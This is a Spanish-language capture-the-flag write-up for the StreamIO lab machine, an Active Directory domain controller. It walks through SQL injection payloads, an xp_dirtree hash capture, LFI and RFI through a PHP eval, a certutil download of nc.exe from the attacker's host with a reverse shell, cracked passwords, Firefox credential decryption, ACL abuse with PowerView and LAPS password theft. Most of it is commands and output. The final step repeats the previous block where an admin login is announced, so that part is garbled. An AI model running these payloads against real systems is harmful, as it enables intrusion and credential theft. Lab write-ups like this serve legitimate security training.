---
layout: post
title: StreamIO
date: 2023-03-31
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/StreamIO-htb/StreamIO.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración de usuarios por Kerberos

* SQL Inyection

* Obtención de hash NetNTLMv2

* LFI

* Análisis de código en PHP

* RFI

* Information Disclosure

* Uso de sqlcmd

* Password spraying

* Decrypt de credenciales de Firefox

* Enumeración con BloodHound

* Abuso del Privilegio WriteOwner

* Uso de Powerview.ps1

* Obtención de credenciales LAPS (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.158 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 10:18 GMT
Nmap scan report for 10.10.11.158
Host is up (0.041s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49701/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49701 10.10.11.158 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 10:19 GMT
Nmap scan report for 10.10.11.158
Host is up (0.081s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-31 17:20:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-03-31T17:21:34+00:00; +6h59m59s from scanner time.
|_http-title: Not Found
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-31T17:20:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.16 seconds
```

Añado el dominio ```streamio.htb``` y el subdominio ```watch.streamio.htb'``` al ```/etc/hosts```

## Puerto 53 (DNS)

Con ```dig```, encuetro el dominio del DC

```null
dig @10.10.11.158 streamio.htb ns

; <<>> DiG 9.18.12-1-Debian <<>> @10.10.11.158 streamio.htb ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 32280
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;streamio.htb.			IN	NS

;; ANSWER SECTION:
streamio.htb.		3600	IN	NS	dc.streamio.htb.

;; ADDITIONAL SECTION:
dc.streamio.htb.	1200	IN	A	10.10.11.158
dc.streamio.htb.	1200	IN	AAAA	dead:beef::80d2:2b56:852b:c069
dc.streamio.htb.	1200	IN	AAAA	dead:beef::ea

;; Query time: 36 msec
;; SERVER: 10.10.11.158#53(10.10.11.158) (UDP)
;; WHEN: Fri Mar 31 10:35:19 GMT 2023
;; MSG SIZE  rcvd: 130
```

Lo añado al ```/etc/hosts```

## Puerto 443 (HTTPS)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb https://streamio.htb/
https://streamio.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[oliver@Streamio.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.158], JQuery[3.4.1], Microsoft-IIS[10.0], PHP[7.2.26,], Script, Title[Streamio], X-Powered-By[PHP/7.2.26, ASP.NET], X-UA-Compatible[IE=edge]
```

La página principal se ve así:

<img src="/writeups/assets/img/StreamIO-htb/1.png" alt="">

La sección de registro e inicio de sesión no está del todo funcional

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u https://streamio.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 300 --no-error -k -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/31 10:44:09 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/register.php         (Status: 200) [Size: 4500]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/logout.php           (Status: 302) [Size: 0] [--> https://streamio.htb/]
/about.php            (Status: 200) [Size: 7825]
/contact.php          (Status: 200) [Size: 6434]
/index.php            (Status: 200) [Size: 13497]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/login.php            (Status: 200) [Size: 4145]
Progress: 53168 / 53170 (100.00%)
===============================================================
2023/03/31 10:44:37 Finished
===============================================================
```

No tengo acceso a ```/admin```. Hago lo mismo para ```watch.streamio.htb```

```null
gobuster dir -u https://watch.streamio.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 300 --no-error -k -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/31 10:45:05 Starting gobuster in directory enumeration mode
===============================================================
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/blocked.php          (Status: 200) [Size: 677]
Progress: 53168 / 53170 (100.00%)
===============================================================
2023/03/31 10:45:33 Finished
===============================================================
```

La página ```/search.php``` se ve así:

<img src="/writeups/assets/img/StreamIO-htb/2.png" alt="">

En caso de intentar probar la inyección SQL típica, aparece una advertencia. El bloqueo no es cierto

<img src="/writeups/assets/img/StreamIO-htb/3.png" alt="">

Es probable que se esté introduciendo una query como esta:

```null
select movie from movies where movie_name like '%test%'
```

El total es de 6 columnas

```null
q=test'union+select+1,2,3,4,5,6--+-
```

<img src="/writeups/assets/img/StreamIO-htb/4.png" alt="">

Listo las bases de datos

```null
q=test'union+select+1,name,3,4,5,6+FROM+master..sysdatabases--+-
```

<img src="/writeups/assets/img/StreamIO-htb/5.png" alt="">

Extraigo las tablas para la base de datos ```STREAMIO```

```null
q=test'union+select+1,name,3,4,5,6+FROM+STREAMIO..sysobjects+WHERE+xtype+%3d+'U'--+-
```

Para ```users``` las columnas

```null
test'union+select+1,name,3,4,5,6+FROM+syscolumns+WHERE+id+%3d+(SELECT+id+FROM+sysobjects+WHERE+name+%3d+'users')--+-
```

<img src="/writeups/assets/img/StreamIO-htb/6.png" alt="">

Obtengo los usuarios y las contraseñas hasheadas

```null
q=test'union+select+1,concat(username,':',password),3,4,5,6+FROM+users--+-
```

<img src="/writeups/assets/img/StreamIO-htb/7.png" alt="">

Los crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 31 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
highschoolmusical (Thane)     
physics69i       (Lenord)     
paddpadd         (admin)     
66boysandgirls.. (yoshihide)     
%$clara          (Clara)     
$monique$1991$   (Bruno)     
$hadoW           (Barry)     
$3xybitch        (Juliette)     
##123a8j8w5123## (Lauren)     
!?Love?!123      (Michelle)     
!5psycho8!       (Victoria)     
!!sabrina$       (Sabrina)     
12g 0:00:00:00 DONE (2023-03-31 11:55) 17.64g/s 21093Kp/s 21093Kc/s 601042KC/s  filimani..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Desde la inyección SQL puedo obtener el hash NetNTLMv2 del Account Machine

```null
'; use master; exec xp_dirtree '\\10.10.16.2\shared';-- 
```

```null
impacket-smbserver shared $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.158,59783)
[*] AUTHENTICATE_MESSAGE (streamIO\DC$,DC)
[*] User DC\DC$ authenticated successfully
[*] DC$::streamIO:aaaaaaaaaaaaaaaa:6789d5f07e7c1fae9b1a04d22732ad74:010100000000000080145e7fdb63d901559cd271f1e6c21100000000010010004d00700071004c006d00570071004c00030010004d00700071004c006d00570071004c0002001000560077005900700070004c0043006f0004001000560077005900700070004c0043006f000700080080145e7fdb63d90106000400020000000800300030000000000000000000000000300000bbc2778ff999ea43ba059b02f427d77ce7294ff5998a216dfe868154325ff8be0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000
[*] Closing down connection (10.10.11.158,59783)
[*] Remaining connections []
```

Un usuario es válido a nivel de sistema

```null
kerbrute userenum -d streamio.htb --dc 10.10.11.158 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 03/31/23 - Ronnie Flathers @ropnop

2023/03/31 12:02:29 >  Using KDC(s):
2023/03/31 12:02:29 >  	10.10.11.158:88

2023/03/31 12:02:29 >  [+] VALID USERNAME:	yoshihide@streamio.htb
2023/03/31 12:02:29 >  Done! Tested 12 usernames (1 valid) in 0.213 seconds
```

Encuentro la que es válida para la web con ```hydra```

```null
hydra -C credentials.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-31 12:10:12
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=Login failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-31 12:10:14
```

Puedo acceder a ```/admin```

<img src="/writeups/assets/img/StreamIO-htb/8.png" alt="">

Fuzzeo por los parámetros

```null
wfuzz -c --hh=1678 -t 200 -H "Cookie: PHPSESSID=0pf4e008ir5fnhng5m390l70m4" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt 'https://streamio.htb/admin/?FUZZ=test'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?FUZZ=test
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000001575:   200        49 L     137 W      1712 Ch     "debug"                                                                                                                                         
000003530:   200        10790    25878 W    320235 Ch   "movie"                                                                                                                                         
                        L                                                                                                                                                                               
000005450:   200        398 L    916 W      12484 Ch    "staff"                                                                                                                                         
000006133:   200        74 L     187 W      2444 Ch     "user"                                                                                                                                          

Total time: 6.420489
Processed Requests: 6453
Filtered Requests: 6449
Requests/sec.: 1005.063
```

Hay un parámetro que es ```?debug=```

<img src="/writeups/assets/img/StreamIO-htb/9.png" alt="">

```null
https://streamio.htb/admin/?debug=C:\Windows\System32\drivers\etc\hosts
```

<img src="/writeups/assets/img/StreamIO-htb/10.png" alt="">

Traigo el ```index.php```

```null
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

Dentro tiene credenciales de acceso a la base de datos

```null
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

Fuzzeo por archivos PHP

```null
gobuster fuzz -u 'https://streamio.htb/admin/FUZZ.php' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -k -b 404
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/admin/FUZZ.php
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Excluded Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/31 13:12:49 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=403] [Length=18] https://streamio.htb/admin/index.php

Found: [Status=200] [Length=58] https://streamio.htb/admin/master.php
```

Me traigo el ```master.php``` a través del LFI. En el código se está haciendo una llamada a nivel de sistema

```null
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
```

Como ```file_get_contents``` va a obtener el contenido de un archivo y se está pasando como argumento al ```eval```, es posible llegar a efectuar un RFI y ejecutar comandos en la máquina víctima

Para acceder al ```master.php```, solo puedo hacerlo desde el LFI, ya que si no no tendría acceso. Monto dos servicios HTTP

```null
python3 -m http.server 80
```

```null
python3 -m http.server 81
```

Descargo el ```nc``` en una ruta de la máquina víctima y lo almaceno en una ruta del AppLocker Bypass

```null
system("certutil.exe -f -urlcache -split http://10.10.16.2:81/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");
```

Gano acceso al sistema

```null
system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.16.2 443");
```

```null
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.158] 63339
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\streamio.htb\admin>
```

Me conecto a la base de datos con las credenciales de antes

```null
PS C:\Temp> sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT name FROM master..sysdatabases;"
sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT name FROM master..sysdatabases;"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
STREAMIO                                                                                                                        
streamio_backup                                                                                                                 

(6 rows affected)
PS C:\Temp> sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT name FROM streamio_backup..sysobjects WHERE xtype = 'U';"
sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT name FROM streamio_backup..sysobjects WHERE xtype = 'U';"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
PS C:\Temp> sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT * from users;"
sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
```

Obtengo nuevos hashes. Se reutiliza la contraseña para el usuario a nivel de sistema

```null
john -w:/usr/share/wordlists/rockyou.txt hashes2 --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 8 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 5 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
get_dem_girls2@yahoo.com (nikk37)     
1g 0:00:00:01 DONE (2023-03-31 15:01) 0.7692g/s 11033Kp/s 11033Kc/s 50212KC/s  filimani..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Gano acceso como este

```null
evil-winrm -i 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\nikk37\Documents> 
```

Puedo ver la primera flag

```null
*Evil-WinRM* PS C:\Users\nikk37\Desktop> type user.txt
cbcb281a9326de92aa36477d9b19fafb
```

Subo el ```SharpHound.exe``` y lo ejecuto

```null
*Evil-WinRM* PS C:\Users\nikk37\Desktop> upload /opt/SharpHound.exe
*Evil-WinRM* PS C:\Users\nikk37\Desktop> .\SharpHound.exe -c All
```

Lo transfiero a mi equipo

```null
*Evil-WinRM* PS C:\Users\nikk37\Desktop> cp .\20230331150522_BloodHound.zip \\10.10.16.2\shared\bh.zip
```

Para importarlo en ```BloodHound```

Está LAPs instalado

```null
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   1:35 AM                Common Files
d-----        2/22/2022   2:57 AM                iis express
d-----        3/28/2022   4:46 PM                internet explorer
d-----        2/22/2022   2:14 AM                LAPS
```

Y el Firefox

```null
*Evil-WinRM* PS C:\Program Files (x86)> dir


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----        2/25/2022  11:35 PM                IIS
d-----        2/25/2022  11:38 PM                iis express
d-----        3/28/2022   4:46 PM                Internet Explorer
d-----        2/22/2022   1:54 AM                Microsoft SQL Server
d-----        2/22/2022   1:53 AM                Microsoft.NET
d-----        5/26/2022   4:09 PM                Mozilla Firefox
```

En caso de que haya credenciales almacenadas las puedo llegar a obtener

```null
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> dir -Force


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                bookmarkbackups
d-----        2/22/2022   2:40 AM                browser-extension-data
d-----        2/22/2022   2:41 AM                crashes
d-----        2/22/2022   2:42 AM                datareporting
d-----        2/22/2022   2:40 AM                minidumps
d-----        2/22/2022   2:42 AM                saved-telemetry-pings
d-----        2/22/2022   2:40 AM                security_state
d-----        2/22/2022   2:42 AM                sessionstore-backups
d-----        2/22/2022   2:40 AM                storage
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:42 AM           5189 addonStartup.json.lz4
-a----        2/22/2022   2:42 AM            310 AlternateServices.txt
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM            208 compatibility.ini
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM         229376 content-prefs.sqlite
-a----        2/22/2022   2:40 AM          98304 cookies.sqlite
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:42 AM        5242880 favicons.sqlite
-a----        2/22/2022   2:41 AM         262144 formhistory.sqlite
-a----        2/22/2022   2:40 AM            778 handlers.json
-a----        2/22/2022   2:40 AM         294912 key4.db
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
-a----        2/22/2022   2:41 AM           2081 logins.json
-a----        2/22/2022   2:42 AM              0 parent.lock
-a----        2/22/2022   2:42 AM          98304 permissions.sqlite
-a----        2/22/2022   2:40 AM            506 pkcs11.txt
-a----        2/22/2022   2:42 AM        5242880 places.sqlite
-a----        2/22/2022   2:42 AM           8040 prefs.js
-a----        2/22/2022   2:42 AM            180 search.json.mozlz4
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:42 AM           1853 sessionstore.jsonlz4
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:42 AM            611 SiteSecurityServiceState.txt
-a----        2/22/2022   2:42 AM           4096 storage.sqlite
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:40 AM          98304 webappsstore.sqlite
-a----        2/22/2022   2:42 AM            141 xulstore.json
```

Me transfiero el ```key4.db``` y el ```logins.json```. Con ```firepwd``` obtengo las credenciales en texto claro

```null
python3 firepwd.py
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Una es válida a nivel de Sistema

```null
crackmapexec smb 10.10.11.158 -u users -p passwords | grep -v "-"
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
```

<img src="/writeups/assets/img/StreamIO-htb/11.png" alt="">

Este usuario perteneciente al grupo Core Staff, tiene ReadLAPSPassword sobre el dominio. Primero le asigno el ACL necesario para poder añadirlo al grupo

```null
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
*Evil-WinRM* PS C:\Temp> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity 'JDgodd'
```

```null
*Evil-WinRM* PS C:\Temp> Add-DomainGroupMember -Identity 'Core Staff' -Members 'JDgodd' -Credential $Cred
```

```null
*Evil-WinRM* PS C:\Temp> net user JDgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:56:42 AM
Password expires             Never
Password changeable          2/23/2022 2:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/31/2023 3:49:34 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.
```

Desde el LDAP, puedo extraer las credenciales de los usuarios locales de la máquina

```null
ldapsearch -H ldap://10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: 4)(6&h9+7]QY+o

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

Me conecto como el Administrador local

```null
ldapsearch -H ldap://10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: 4)(6&h9+7]QY+o

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
